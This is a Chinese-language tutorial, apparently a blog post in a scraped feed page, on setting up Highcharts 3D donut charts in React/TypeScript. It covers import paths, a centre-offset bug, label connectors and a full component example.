                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<p>Highcharts 是一个功能完备、生态成熟的前端图表库，拥有良好的类型定义与主题生态。而 Highcharts 的 3D 饼图能力（3D Donut）可以进一步呈现层次与空间感，适合用于大屏可视化与运营展示场景。</p>
<hr/>
<h2 data-id="heading-1">使用流程</h2>
<h3 data-id="heading-2">准备工作</h3>
<ul>
<li>安装依赖：
<ul>
<li><code>highcharts</code>（核心库）</li>
<li><code>highcharts/highcharts-3d</code>（3D 模块）</li>
<li>可选：<code>highcharts-react-official</code>（React 包装组件，后文会解释它与原生 <code>div</code> 方式的差异与坑位）</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">yarn add highcharts highcharts-react-official
</code></pre>
<ul>
<li>引入与初始化 3D 模块（注意路径与版本兼容）：</li>
</ul>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Highcharts</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'highcharts'</span>;
<span class="hljs-keyword">import</span> highcharts3d <span class="hljs-keyword">from</span> <span class="hljs-string">'highcharts/highcharts-3d'</span>;

<span class="hljs-comment">// 初始化 3D 能力（必须调用）</span>
<span class="hljs-title function_">highcharts3d</span>(<span class="hljs-title class_">Highcharts</span>);
</code></pre>
<blockquote>
<p>说明：部分文章或旧版本文档使用 <code>highcharts/modules/3d</code>，在现代构建工具（Webpack 5/Vite）或较新版本下可能出现构建失败或类型不匹配，推荐使用 <code>highcharts/highcharts-3d</code> 路径。</p>
</blockquote>
<h3 data-id="heading-3">创建第一个 3D 环形图</h3>
<ul>
<li>HTML 容器（单个）：</li>
</ul>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"dought"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"height:300px;width:100%"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<ul>
<li>JavaScript 初始化（最小可运行示例）：</li>
</ul>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Highcharts</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'highcharts'</span>;
<span class="hljs-keyword">import</span> highcharts3d <span class="hljs-keyword">from</span> <span class="hljs-string">'highcharts/highcharts-3d'</span>;
<span class="hljs-title function_">highcharts3d</span>(<span class="hljs-title class_">Highcharts</span>);

<span class="hljs-keyword">const</span> <span class="hljs-attr">options</span>: <span class="hljs-title class_">Highcharts</span>.<span class="hljs-property">Options</span> = {
  <span class="hljs-attr">chart</span>: { <span class="hljs-attr">type</span>: <span class="hljs-string">'pie'</span>, <span class="hljs-attr">options3d</span>: { <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">alpha</span>: <span class="hljs-number">45</span> }, <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">'transparent'</span> },
  <span class="hljs-attr">title</span>: { <span class="hljs-attr">text</span>: <span class="hljs-string">'总成本'</span>, <span class="hljs-attr">align</span>: <span class="hljs-string">'center'</span>, <span class="hljs-attr">verticalAlign</span>: <span class="hljs-string">'middle'</span>, <span class="hljs-attr">floating</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">useHTML</span>: <span class="hljs-literal">true</span> },
  <span class="hljs-attr">plotOptions</span>: {
    <span class="hljs-attr">pie</span>: {
      <span class="hljs-attr">innerSize</span>: <span class="hljs-string">'65%'</span>,
      <span class="hljs-attr">depth</span>: <span class="hljs-number">12</span>,
      <span class="hljs-attr">center</span>: [<span class="hljs-string">'50%'</span>, <span class="hljs-string">'50%'</span>],
      <span class="hljs-attr">size</span>: <span class="hljs-string">'90%'</span>,
      <span class="hljs-attr">dataLabels</span>: { <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">format</span>: <span class="hljs-string">'{point.name}: {point.y}元'</span> },
    },
  },
  <span class="hljs-attr">series</span>: [{ <span class="hljs-attr">type</span>: <span class="hljs-string">'pie'</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'金额'</span>, <span class="hljs-attr">data</span>: [ [<span class="hljs-string">'成本'</span>, <span class="hljs-number">1200</span>], [<span class="hljs-string">'收益'</span>, <span class="hljs-number">250</span>], [<span class="hljs-string">'2收益'</span>, <span class="hljs-number">158</span>] ] }],
};

<span class="hljs-title class_">Highcharts</span>.<span class="hljs-title function_">chart</span>(<span class="hljs-string">'dought'</span>, options);
</code></pre>
<hr/>
<h2 data-id="heading-4">注意事项与踩坑指南</h2>
<h3 data-id="heading-5">版本兼容性问题</h3>
<ul>
<li>模块路径差异：
<ul>
<li>旧文档常见 <code>highcharts/modules/3d</code>，但在部分 bundler/类型定义配置下会报错或打包失败。</li>
<li>推荐：<code>import highcharts3d from 'highcharts/highcharts-3d'; highcharts3d(Highcharts);</code></li>
</ul>
</li>
<li>ESM/CJS 混用：
<ul>
<li>在 Vite/webpack5 环境下，若 TS <code>moduleResolution</code> 或 <code>target</code> 不一致，会出现类型提示异常但能运行；务必保持 <code>tsconfig</code> 与 bundler 配置一致。</li>
<li>为什么新版更偏向 CJS：Highcharts 的部分功能模块（如 <code>highcharts/highcharts-3d</code>）以 UMD/CJS 形式发布，保持与旧版 bundler、Node 环境以及浏览器直引的最大兼容；多数构建工具会优先命中包的 <code>exports</code> 中 <code>require</code> 分支，使默认导出函数（<code>highcharts3d</code>）在 CJS 路径下更稳定，避免 ESM/默认导出互操作导致的 <code>undefined</code> 或类型不匹配。</li>
<li>ESM 与 CJS 的核心区别（速查）：
<ul>
<li>语法：ESM 使用 <code>import/export</code>（静态、可树摇），CJS 使用 <code>require/module.exports</code>（动态、不可树摇）。</li>
<li>加载：ESM 静态依赖解析，利于 bundler 优化；CJS 运行时解析，允许条件/动态 <code>require</code>。</li>
<li>默认导出互操作：CJS 引入 ESM 时常见 <code>require('pkg').default</code> 差异；ESM 引入 CJS 时需留意命名/默认导出包装。</li>
<li>环境支持：浏览器与现代 bundler更偏 ESM；Node 仍广泛支持 CJS，两者在解析与条件导出上存在差异。</li>
</ul>
</li>
<li>实战建议：
<ul>
<li>统一 <code>tsconfig.json</code> 与 bundler 的模块设置（如 <code>module: 'ESNext'</code>、<code>moduleResolution: 'bundler'</code> 或与工程一致的值），降低互操作差异。</li>
<li>对 Highcharts 3D 模块使用“安全默认写法”：<code>import highcharts3d from 'highcharts/highcharts-3d'; highcharts3d(Highcharts);</code>，该写法在 ESM/CJS 两种入口下都能正常工作。</li>
<li>如确需纯 CJS：<code>const Highcharts = require('highcharts'); const highcharts3d = require('highcharts/highcharts-3d'); highcharts3d(Highcharts);</code>，但在 React+TS 项目里更推荐前述 ESM 写法。</li>
</ul>
</li>
</ul>
</li>
<li>类型定义与 JSX：
<ul>
<li>在 React + TS 项目中，若使用 <code>HighchartsReact</code> 且 JSX 类型不兼容，可改为 <code>React.createElement</code> 或直接 <code>Highcharts.chart</code> 方式以规避。</li>
</ul>
</li>
</ul>
<h4 data-id="heading-6">3. 为什么使用 highcharts-react-official 渲染会出现饼图偏移，改用 div 就解决了？原理是什么</h4>
<ul>
<li>现象：
<ul>
<li>使用 <code>HighchartsReact</code> 在某些布局（例如父容器 <code>display:flex</code>、存在 <code>transform</code>、或首次渲染时容器宽度尚未稳定）下，3D 饼图的中心点计算（依赖容器的实际尺寸与 <code>plotLeft/plotTop</code>）可能产生偏移。</li>
</ul>
</li>
<li>原因：
<ul>
<li><code>HighchartsReact</code> 封装层在 <code>componentDidMount/useEffect</code> 阶段创建图表，有时容器尚未完成布局或尺寸为 0，之后再 reflow 会导致 3D 透视与 <code>center/size</code> 百分比计算出现“错位”。</li>
<li>包装层会额外多一层 <code>div</code>，在包含 <code>position/transform</code> 的父级样式下，Highcharts 对 <code>getBoundingClientRect</code> 的读取与 3D 计算（<code>alpha</code> 透视）可能受影响，中心与标签的像素对齐误差被放大。</li>
</ul>
</li>
<li>解决：
<ul>
<li>改用原生 <code>Highcharts.chart(containerId, options)</code>，保证仅一个容器层；在 React 中于 <code>useEffect</code> 里创建与销毁，确保容器尺寸稳定后再渲染。</li>
<li>若仍需使用 <code>HighchartsReact</code>：
<ul>
<li>显式传 <code>containerProps={{ style: { width: '100%', height: &lt;固定高度&gt;, position: 'relative', overflow: 'visible' } }}</code>。</li>
<li>在外层布局稳定后再渲染组件，或在首次渲染后调用 <code>chart.reflow()</code>。</li>
<li>明确设置 <code>plotOptions.pie.center = ['50%', '50%']</code> 与 <code>size = '90%'</code>，并尽量避免父级 <code>transform</code>。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 data-id="heading-7">数据加载与更新</h3>
<ul>
<li>动态加载：
<ul>
<li>在 React 中，使用 <code>useEffect</code> 监听数据变化，调用 <code>chart.update({ series: [{ data }] }, false)</code> 再 <code>chart.redraw()</code>。</li>
</ul>
</li>
<li>异步坑点：
<ul>
<li>初次数据为空，后续更新时若组件卸载重挂，需先 <code>destroy()</code> 再重新 <code>chart(...)</code>，避免多实例叠加。</li>
<li>数据类型混用（字符串/数字）会导致格式化异常：统一在入参处做 <code>Number(value) || 0</code> 的处理。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-8">性能优化</h3>
<ul>
<li>3D 饼图不适合超大量数据，建议控制项数（&lt; 12）。</li>
<li>关闭不必要的动画与阴影；必要时降低 <code>alpha</code> 或禁用后处理效果（在 Highcharts 3D 中主要与视觉相关）。</li>
<li>合理设置 <code>dataLabels</code>：
<ul>
<li>使用两段引导线并控制长度，避免过密导致重叠。</li>
<li>小值可在 <code>formatter</code> 中阈值过滤或缩短文本。</li>
</ul>
</li>
</ul>
<hr/>
<h2 data-id="heading-9">深入探讨：配置项详解</h2>
<h3 data-id="heading-10">内置配置项</h3>
<ul>
<li><code>chart.options3d.enabled/alpha</code>：开启 3D 与倾角，过大倾角会放大偏移与重叠问题。</li>
<li><code>plotOptions.pie.innerSize</code>：环形图的内径大小，百分比字符串更易与容器自适应配合。</li>
<li><code>plotOptions.pie.depth</code>：3D 厚度，过大可能导致遮挡。</li>
<li><code>series[n].center</code>：强制图心坐标（百分比数组），可稳定对齐。</li>
<li><code>series[n].size</code>：半径，百分比更利于自适应布局。</li>
<li><code>dataLabels.format/useHTML/formatter</code>：标签文本与 HTML 自定义；<code>useHTML</code> 可实现两行样式。</li>
</ul>
<h3 data-id="heading-11">自定义配置（项目实践）</h3>
<ul>
<li>透明度：
<ul>
<li>利用 <code>Highcharts.color(color).setOpacity(sliceOpacity).get()</code> 为每个扇形生成半透明色，视觉更柔和。</li>
</ul>
</li>
<li>两段引导线：
<ul>
<li><code>plotOptions.pie.softConnector = true</code> 启用两段式；</li>
<li><code>dataLabels.distance</code> 控制第二段长度；</li>
<li><code>dataLabels.crookDistance</code> 控制第一段拐点位置（可以传百分比字符串）；</li>
<li><code>connectorColor/connectorWidth</code> 控制线条颜色与粗细。</li>
</ul>
</li>
<li>居中与图例：
<ul>
<li><code>legend.enabled = true</code> + <code>center: ['50%', '50%']</code> + <code>size: '90%'</code>，确保图例与图形协调摆放。</li>
</ul>
</li>
</ul>
<hr/>
<h2 data-id="heading-12">案例代码（React 组件版，使用原生 div 渲染）</h2>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Highcharts</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'highcharts'</span>;
<span class="hljs-keyword">import</span> highcharts3d <span class="hljs-keyword">from</span> <span class="hljs-string">'highcharts/highcharts-3d'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-title function_">highcharts3d</span>(<span class="hljs-title class_">Highcharts</span>);

<span class="hljs-keyword">const</span> <span class="hljs-title class_">HCDonut3DChart</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">FC</span>&lt;<span class="hljs-built_in">any</span>&gt; = <span class="hljs-function">(<span class="hljs-params">props</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> {
    dataList = [],
    title = <span class="hljs-string">''</span>,
    innerSize = <span class="hljs-string">'65%'</span>,
    sliceHeightRange = [<span class="hljs-number">8</span>, <span class="hljs-number">20</span>],
    depth,
    colors,
    containerId = <span class="hljs-string">'dought'</span>,
    sliceOpacity = <span class="hljs-number">0.85</span>,
    labelDistance = <span class="hljs-number">40</span>,
    connectorCrookDistance = <span class="hljs-string">'40%'</span>,
    connectorColor = <span class="hljs-string">'#999'</span>,
    connectorWidth = <span class="hljs-number">1</span>,
    labelUseHTML = <span class="hljs-literal">true</span>,
    labelNameColor = <span class="hljs-string">'#6A7570'</span>,
    labelValueColor = <span class="hljs-string">'#6A7570'</span>,
    labelNameFontSize = <span class="hljs-number">12</span>,
    labelValueFontSize = <span class="hljs-number">12</span>,
  } = props || {};

  <span class="hljs-keyword">const</span> [minH, maxH] = sliceHeightRange || [<span class="hljs-number">8</span>, <span class="hljs-number">20</span>];
  <span class="hljs-keyword">const</span> computedDepth = <span class="hljs-keyword">typeof</span> depth === <span class="hljs-string">'number'</span> ? depth : <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-number">1</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">round</span>((minH + maxH) / <span class="hljs-number">2</span>));

  <span class="hljs-keyword">const</span> seriesData = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> list = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(dataList) ? dataList : [];
    <span class="hljs-keyword">return</span> list.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">item: <span class="hljs-built_in">any</span>, idx: <span class="hljs-built_in">number</span></span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> { name, value } = item || {};
      <span class="hljs-keyword">const</span> y = <span class="hljs-title class_">Number</span>(value) || <span class="hljs-number">0</span>;
      <span class="hljs-keyword">const</span> color = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(colors) &amp;&amp; colors.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span> ? colors[idx % colors.<span class="hljs-property">length</span>] : <span class="hljs-literal">undefined</span>;
      <span class="hljs-keyword">const</span> fillColor = color ? (<span class="hljs-title class_">Highcharts</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>).<span class="hljs-property">color</span>?.(color)?.<span class="hljs-title function_">setOpacity</span>(sliceOpacity)?.<span class="hljs-property">get</span>?.() || color : <span class="hljs-literal">undefined</span>;
      <span class="hljs-keyword">return</span> fillColor ? { name, y, <span class="hljs-attr">color</span>: fillColor } : { name, y };
    });
  }, [dataList, colors, sliceOpacity]);

  <span class="hljs-keyword">const</span> options = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> nameStyle = <span class="hljs-string">`color:<span class="hljs-subst">${labelNameColor}</span>;font-size:<span class="hljs-subst">${labelNameFontSize}</span>px;font-weight:400;line-height:18px;`</span>;
    <span class="hljs-keyword">const</span> valueStyle = <span class="hljs-string">`color:<span class="hljs-subst">${labelValueColor}</span>;font-size:<span class="hljs-subst">${labelValueFontSize}</span>px;font-weight:400;line-height:18px;`</span>;
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">chart</span>: { <span class="hljs-attr">type</span>: <span class="hljs-string">'pie'</span>, <span class="hljs-attr">options3d</span>: { <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">alpha</span>: <span class="hljs-number">45</span> }, <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">'transparent'</span> },
      <span class="hljs-attr">title</span>: { <span class="hljs-attr">text</span>: title, <span class="hljs-attr">useHTML</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">align</span>: <span class="hljs-string">'center'</span>, <span class="hljs-attr">floating</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">verticalAlign</span>: <span class="hljs-string">'middle'</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">0</span> },
      <span class="hljs-attr">legend</span>: { <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">layout</span>: <span class="hljs-string">'horizontal'</span>, <span class="hljs-attr">align</span>: <span class="hljs-string">'center'</span>, <span class="hljs-attr">verticalAlign</span>: <span class="hljs-string">'bottom'</span> },
      <span class="hljs-attr">credits</span>: { <span class="hljs-attr">enabled</span>: <span class="hljs-literal">false</span> },
      <span class="hljs-attr">tooltip</span>: { <span class="hljs-attr">headerFormat</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">pointFormat</span>: <span class="hljs-string">'{point.name}: &lt;b&gt;{point.y}元&lt;/b&gt;'</span> },
      <span class="hljs-attr">plotOptions</span>: {
        <span class="hljs-attr">pie</span>: {
          innerSize,
          <span class="hljs-attr">depth</span>: computedDepth,
          <span class="hljs-attr">allowPointSelect</span>: <span class="hljs-literal">false</span>,
          <span class="hljs-attr">softConnector</span>: <span class="hljs-literal">true</span>,
          <span class="hljs-attr">showInLegend</span>: <span class="hljs-literal">true</span>,
          <span class="hljs-attr">dataLabels</span>: {
            <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span>,
            <span class="hljs-attr">useHTML</span>: labelUseHTML,
            <span class="hljs-attr">formatter</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
              <span class="hljs-keyword">const</span> <span class="hljs-attr">p</span>: <span class="hljs-built_in">any</span> = (<span class="hljs-variable language_">this</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>).<span class="hljs-property">point</span> || {};
              <span class="hljs-keyword">const</span> n = p.<span class="hljs-property">name</span> ?? <span class="hljs-string">''</span>;
              <span class="hljs-keyword">const</span> y = <span class="hljs-keyword">typeof</span> p.<span class="hljs-property">y</span> === <span class="hljs-string">'number'</span> ? p.<span class="hljs-property">y</span> : <span class="hljs-title class_">Number</span>(p.<span class="hljs-property">y</span>) || <span class="hljs-number">0</span>;
              <span class="hljs-keyword">return</span> <span class="hljs-string">`&lt;div&gt;&lt;div style="<span class="hljs-subst">${nameStyle}</span>"&gt;<span class="hljs-subst">${n}</span>&lt;/div&gt;&lt;div style="<span class="hljs-subst">${valueStyle}</span>"&gt;<span class="hljs-subst">${y}</span>元&lt;/div&gt;&lt;/div&gt;`</span>;
            },
            <span class="hljs-attr">style</span>: { <span class="hljs-attr">textOutline</span>: <span class="hljs-string">'none'</span> },
            <span class="hljs-attr">distance</span>: labelDistance,
            <span class="hljs-attr">crookDistance</span>: connectorCrookDistance,
            connectorColor,
            connectorWidth,
          },
        },
      },
      <span class="hljs-attr">series</span>: [{ <span class="hljs-attr">type</span>: <span class="hljs-string">'pie'</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'金额'</span>, <span class="hljs-attr">data</span>: seriesData, <span class="hljs-attr">center</span>: [<span class="hljs-string">'50%'</span>, <span class="hljs-string">'50%'</span>], <span class="hljs-attr">size</span>: <span class="hljs-string">'90%'</span> } <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>],
    } <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>;
  }, [title, innerSize, computedDepth, seriesData, labelUseHTML, labelNameColor, labelValueColor, labelNameFontSize, labelValueFontSize, labelDistance, connectorCrookDistance, connectorColor, connectorWidth]);

  <span class="hljs-keyword">const</span> chartInstanceRef = <span class="hljs-title class_">React</span>.<span class="hljs-property">useRef</span>&lt;<span class="hljs-built_in">any</span>&gt;(<span class="hljs-literal">null</span>);
  <span class="hljs-title class_">React</span>.<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">if</span> (chartInstanceRef.<span class="hljs-property">current</span>) { chartInstanceRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">destroy</span>(); chartInstanceRef.<span class="hljs-property">current</span> = <span class="hljs-literal">null</span>; }
    chartInstanceRef.<span class="hljs-property">current</span> = <span class="hljs-title class_">Highcharts</span>.<span class="hljs-title function_">chart</span>(containerId, options);
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> { <span class="hljs-keyword">if</span> (chartInstanceRef.<span class="hljs-property">current</span>) { chartInstanceRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">destroy</span>(); chartInstanceRef.<span class="hljs-property">current</span> = <span class="hljs-literal">null</span>; } };
  }, [containerId, options]);

  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">{containerId}</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">height:</span> '<span class="hljs-attr">100</span>%', <span class="hljs-attr">width:</span> '<span class="hljs-attr">100</span>%' }} /&gt;</span></span>;
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">HCDonut3DChart</span>;
</code></pre>
<blockquote>
<p>说明：示例中通过解构读取 <code>props</code>，并在必要处做数字归一化，减少不必要类型定义，贴近业务编程习惯。</p>
</blockquote>
<hr/>
<h2 data-id="heading-13">动态更新与最佳实践</h2>
<ul>
<li>更新数据：</li>
</ul>
<pre><code class="hljs language-ts" lang="ts">chart.<span class="hljs-title function_">update</span>({ <span class="hljs-attr">series</span>: [{ <span class="hljs-attr">data</span>: newData }] }, <span class="hljs-literal">false</span>);
chart.<span class="hljs-title function_">redraw</span>();
</code></pre>
<ul>
<li>更新样式（示例：调节两段引导线长度）：</li>
</ul>
<pre><code class="hljs language-ts" lang="ts">chart.<span class="hljs-title function_">update</span>({ <span class="hljs-attr">plotOptions</span>: { <span class="hljs-attr">pie</span>: { <span class="hljs-attr">dataLabels</span>: { <span class="hljs-attr">distance</span>: <span class="hljs-number">48</span>, <span class="hljs-attr">crookDistance</span>: <span class="hljs-string">'45%'</span> } } } });
</code></pre>
<ul>
<li>生命周期管理（React）：
<ul>
<li>在 <code>useEffect</code> 中创建与销毁；避免多实例与内存泄漏。</li>
<li>容器尺寸变化时调用 <code>chart.reflow()</code>。</li>
</ul>
</li>
</ul>
<hr/>
<h2 data-id="heading-14">踩坑与解决</h2>
<ul>
<li>图心偏移：明确设置 <code>series.center</code> 与 <code>series.size</code>，并在布局稳定后再初始化；改用原生 <code>Highcharts.chart</code> 可避免包装层带来的测量差异。</li>
<li>颜色不匹配：为数据点绑定颜色（而不是直接依赖 <code>options.colors</code>），以防主题覆盖或 <code>undefined</code> 导致第三方主题读取 <code>colors[0]</code> 报错。</li>
<li>标签拥挤：开启两段引导线并调节长度；小值可在 <code>formatter</code> 中阈值过滤。</li>
<li>3D 模块未初始化：必须 <code>highcharts3d(Highcharts)</code>，否则 <code>options3d</code> 不生效或报错。</li>
<li>类型不兼容：当 TS JSX 配置不一致时，使用 <code>React.createElement</code> 或直接 <code>Highcharts.chart</code> 渲染。</li>
</ul>
<hr/>
<h2 data-id="heading-15">配置项速查（精选）</h2>
<ul>
<li><code>chart.options3d.enabled/alpha</code>：启用 3D 与倾角。</li>
<li><code>plotOptions.pie.innerSize/depth</code>：环形内径与厚度。</li>
<li><code>plotOptions.pie.softConnector</code>：启用两段式引导线。</li>
<li><code>dataLabels.useHTML/formatter/style</code>：两行标签与样式；<code>textOutline: 'none'</code> 去描边更清晰。</li>
<li><code>dataLabels.distance/crookDistance</code>：两段线长度与拐点位置；<code>connectorColor/connectorWidth</code> 控线型。</li>
<li><code>series.center/size</code>：居中与自适应半径，强烈建议使用百分比字符串。</li>
<li><code>tooltip.pointFormat</code>：统一金额单位；结合格式化函数确保数值正确。</li>
</ul>
<hr/>
<h2 data-id="heading-16">案例分析：从需求到实现</h2>
<ul>
<li>需求：在“日前经济最优/微协同”页面展示“优化总成本组成”与“实际总成本组成”，标签两行显示（名称 + 金额），图例与颜色对齐，支持导入导出。</li>
<li>实现：
<ul>
<li>颜色映射固定三类（负荷/光伏/储能），为数据点绑定 <code>itemStyle.color</code>；</li>
<li>两段引导线：<code>distance=40</code>、<code>crookDistance='45%'</code>；</li>
<li>中心标题用 <code>useHTML</code> 输出，并拆解为两行（<code>总成本</code> 与金额 <code>--/xxx元</code>）；</li>
<li>动态数据更新时，销毁旧实例再创建，避免偏移与堆叠；</li>
<li>上传下载逻辑与图表刷新在 hook 中解耦，实现稳态渲染。</li>
</ul>
</li>
<li>效果：在不同数据规模与容器布局下，图心稳定、颜色一致、标签清晰，运营展示可读性显著提升。</li>
</ul>
<hr/>
<h2 data-id="heading-17">结语</h2>
<p>Highcharts 的 3D 环形图兼具表现力与稳定性。生产落地的关键在于：正确初始化 3D 模块、保证容器尺寸稳定、强制图心与半径、为数据点绑定颜色、合理管理生命周期与更新流程。结合本文的实战代码与优化建议，你可以快速在任意页面构建高质量的 3D Donut。进一步可尝试主题切换、渐变色、动效过渡以及与其他图表的联动，释放更多可视化潜力。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Kuikly 基础之封装自定义音频播放模块]]></title>    <link>https://juejin.cn/post/7575488180981153792</link>    <guid>https://juejin.cn/post/7575488180981153792</guid>    <pubDate>2025-11-24T03:41:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575488180981153792" data-draft-id="7575488180981071872" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Kuikly 基础之封装自定义音频播放模块"/> <meta itemprop="keywords" content="前端"/> <meta 